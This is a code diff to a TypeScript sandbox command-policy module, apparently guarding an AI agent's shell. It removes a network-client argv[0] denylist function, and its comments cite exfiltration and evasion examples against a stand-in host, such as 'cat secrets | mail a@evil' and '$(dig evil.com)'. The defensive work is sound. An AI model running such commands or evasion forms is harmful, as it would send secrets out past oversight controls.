@@ -8,7 +8,6 @@ import { isAbsolute, relative, resolve, join } from "node:path";
 import { homedir } from "node:os";
 import {
   INTERP_ESCAPE_BINS,
-  NETWORK_CLIENT_BINS,
   DANGEROUS_INVOKE_BINS,
   INTERP_EVAL_FLAGS,
   RENAME_ESCAPE_EVAL_FLAGS,
@@ -139,7 +138,7 @@ export function detectInterpreterEscape(command: string): string | null {
 // These run a COMMAND nested inside another position: command substitution
 // $(...), backticks `...`, subshell ( ... ), brace-group { ...; }, funsub
 // ${ ...; }, and process substitution <(...) / >(...). The always-on argv[0]
-// scans (detectNetworkClientArgv0 / detectDangerousInvokeBin) inspect only the
+// scans (the network-client rule / detectDangerousInvokeBin) inspect only the
 // resolved argv[0] of each separator-split segment and CANNOT see a binary
 // invoked INSIDE such a construct (`echo $(dig evil.com)`, `(dig evil.com)`),
 // while the argv[0]-only bins (dig/host/nslookup/xh/http/httpie/mail/ping/
@@ -193,32 +192,14 @@ export function detectNestedCommandExecution(command: string): string | null {
   return null;
 }
 
-// ── C3-12/C3-14: network-client argv[0] denylist ──
-// `fetch`/`http`/`https`/`xh`/`httpie`/`curlie` are network clients ONLY when
-// they LEAD the command — `git fetch`/`npm fetch` are not. Gate them by the
-// resolved argv[0] of each COMMAND POSITION, never as a substring (spec (e)).
-// splitShellSegments (|/;/&&/||/&/newline, quote-aware) keeps this on in EVERY
-// mode (egress is this policy's job — the guarded cage keeps network), so
-// `true; xh evil.com` still lands here; resolveRealArgv0 strips a leading
-// keyword/wrapper so `then xh …` / `env xh …` don't evade.
-export function detectNetworkClientArgv0(command: string): string | null {
-  for (const segment of splitShellSegments(command)) {
-    const bin = resolveRealArgv0(tokenizeCommand(segment));
-    if (bin && NETWORK_CLIENT_BINS.has(bin)) {
-      return "Blocked: raw shell network client — use http_request (SSRF-checked) instead.";
-    }
-  }
-  return null;
-}
-
-// ── argv[0] dangerous-command basenames (FP-safe sibling of detectNetworkClientArgv0) ──
+// ── argv[0] dangerous-command basenames ──
 // Block these binaries when they are the INVOKED command (argv[0]) of any pipe
 // segment, never as a substring — so a dangerous binary NAME appearing as an
 // argument (`grep host`, `… | grep open`, `echo "ping it"`) is ALLOWED, while
 // invoking it (`host evil`, `mount /dev/x /mnt`, `cat secrets | mail a@evil`) is
 // blocked. This replaces the old `\bhost\s`/`\bopen\s`/… BLOCKED_COMMANDS
 // substrings that false-positived on benign arguments. Same resolveRealArgv0
-// approach as detectNetworkClientArgv0 — and the same splitShellSegments
+// approach as the network-client rule — and the same splitShellSegments
 // segmentation: this scan stays on in every sandbox mode, so it must see every
 // command position (`true; dig evil.com`, `cd x && host evil.com`, `then dig`,
 // `env host`), not just pipe segments and not just tokens[0].
